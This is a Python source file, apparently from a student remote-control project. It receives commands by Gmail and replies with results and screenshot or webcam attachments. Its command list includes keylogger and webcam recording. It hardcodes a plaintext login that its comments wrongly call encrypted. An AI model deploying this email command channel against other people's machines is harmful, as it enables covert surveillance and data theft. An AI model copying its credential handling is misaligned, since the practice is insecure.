import email
import imaplib
import smtplib
from email.mime.text import MIMEText
from email.utils import formataddr, make_msgid
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from textwrap import dedent
from email import encoders


import os


SMTP_SSL_HOST = 'smtp.gmail.com'
SMTP_SSL_PORT = 465
IMAP_SSL_HOST = 'imap.gmail.com'

# use username or email to log in
DEFAULT_USERNAME = 'receiverimap002@gmail.com'
DEFAULT_PASSWORD = 'receiver1234'  # encrypted password using JSON

# TRUSTED SENDERS
TRUSTED_SENDERS = ['sendersmtp001@gmail.com']  # encrypted using JSON

# SUBJECCT
REGCONIZE_SUBJECT = 'RDM'
COMMANDS = ['LIST PROCESS', 'KILL PROCESS', 'LIST APP', 'KILL APP', 'CAPTURE SCREEN', 'RECORD SCREEN',
            'SHOT WEBCAM', 'RECORD WEBCAM',  'FILE SYSTEM', 'REGISTRY', 'KEYLOGGER', 'SHUTDOWN', 'RESTART']


# TEMPLATES
TEMPLATE_PATH = os.path.join('src', 'templates')
TEMPLATE_FILE_NAMES = {'LIST PROCESS': 'list-process.html', 'KILL PROCESS': 'kill-process.html',
                       'LIST APP': 'list-app.html', 'KILL APP': 'kil-app.html', 'CAPTURE SCREEN': 'capture-screen.html',
                       'RECORD SCREEN': 'record-screen.html', 'SHOT WEBCAM': 'shot-webcam.html', 'RECORD WEBCAM': 'record-webcam.html',
                       'FILE SYSTEM': 'file-system.html', 'REGISTRY': 'registry.html', 'KEYLOGGER': 'keylogger.html',
                       'SHUTDOWN': 'shutdown.html', 'RESTART': 'restart.html'}


# TODO
# Auto read mail to extract command in 5-10s => receiver.py
# Format
# [RDM - COMMAND] - content


class Receiver():
    def __init__(self, username=DEFAULT_USERNAME, password=DEFAULT_PASSWORD):

        self.server = smtplib.SMTP_SSL(SMTP_SSL_HOST, SMTP_SSL_PORT)
        self.server.login(username, password)
        self.addrs = username

        # connect to the server and go to its inbox
        self.mail = imaplib.IMAP4_SSL(IMAP_SSL_HOST)
        self.mail.login(username, password)
        # we choose the inbox but you can select others
        self.mail.select('inbox')

    # def check_mails(self):
    #     self.mail.select(readonly=False)
    #     _, data = self.mail.search(None, '(UNANSWERED)')
    #     # _, data = self.mail.search(None, 'All')
    #     self.mail.close()
    #     for mail_number in data[0].split():
    #         if self.is_valid_mail(mail_number):
    #             self.reply(mail_number)
    #             break

    def get_unanswered_mails(self):
        self.mail.select(readonly=False)
        # _, data = self.mail.search(None, 'ALL')
        _, data = self.mail.search(None, '(UNANSWERED)')
        self.mail.close()
        return data[0].split()

    def is_valid_mail(self, mail_number):
        self.mail.select(readonly=True)
        _, data = self.mail.fetch(mail_number, '(RFC822)')
        self.mail.close()
        mail = email.message_from_bytes(data[0][1])

        mail_from = mail['From']
        mail_subject = mail['Subject']
        if mail.is_multipart():
            mail_content = ''
            for part in mail.get_payload():
                if part.get_content_type() == 'text/plain':
                    mail_content += part.get_payload()
        else:
            mail_content = mail.get_payload()

        print(mail_from, mail_subject, mail_content)

        if mail_from not in TRUSTED_SENDERS:
            return None, None

        subject, command_subject = mail_subject.split('-')
        if subject != REGCONIZE_SUBJECT or command_subject not in COMMANDS:
            return None, None

        return command_subject, mail_content

    def reply(self, mail_number, content):
        self.mail.select(readonly=True)
        _, data = self.mail.fetch(mail_number, '(RFC822)')
        self.mail.close()
        self.send_auto_reply(email.message_from_bytes(data[0][1]), content)
        self.mail.select(readonly=False)
        self.mail.store(mail_number, '+FLAGS', '\\Answered')
        self.mail.close()

    def create_auto_reply(self, original, content):
        mail = MIMEMultipart('alternative')
        mail['Message-ID'] = make_msgid()
        mail['References'] = mail['In-Reply-To'] = original['Message-ID']
        mail['Subject'] = 'Re: ' + original['Subject']
        mail['From'] = self.addrs
        mail['To'] = original['Reply-To'] or original['From']

        # get template command email from command
        command = original['Subject'].split('-')[1]

        template = os.path.join(
            TEMPLATE_PATH, TEMPLATE_FILE_NAMES[command])
        body_html = open(template)
        body_html = body_html.read().format(content)

        # attach
        mail.attach(MIMEText(body_html, 'html'))

        # attach files
        file_name = None
        if command == 'CAPTURE SCREEN':
            file_name = 'screenshot.png'
        elif command == 'RECORD SCREEN':
            file_name = 'screen-record.avi'
        elif command == 'SHOT WEBCAM':
            file_name = 'webcam.png'
        elif command == 'RECORD WEBCAM':
            file_name = 'webcam-record.avi'

        if file_name:
            path = os.path.join('.temp', file_name)
            mail.attach(self.attach_file(path))

        return mail

    def send_auto_reply(self, original, content):
        self.server.sendmail(
            self.addrs, [original['From']],
            self.create_auto_reply(original, content).as_bytes())
        log = 'Replied to “%s” for the mail “%s”' % (original['From'],
                                                     original['Subject'])
        print(log)
        # try:
        #     call(['notify-send', log])
        # except FileNotFoundError:
        #     pass

    def attach_file(self, file_name):
        try:
            with open(file_name, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())

            encoders.encode_base64(part)

            part.add_header("Content-Disposition",
                            f"attachment; filename= {file_name}",)

            return part

        except Exception as e:
            print(f'Oh no! We didn\'t found the attachment!\n{e}')

    def quit(self):
        self.server.quit()


# R = Receiver()
# R.get_recent_mail()
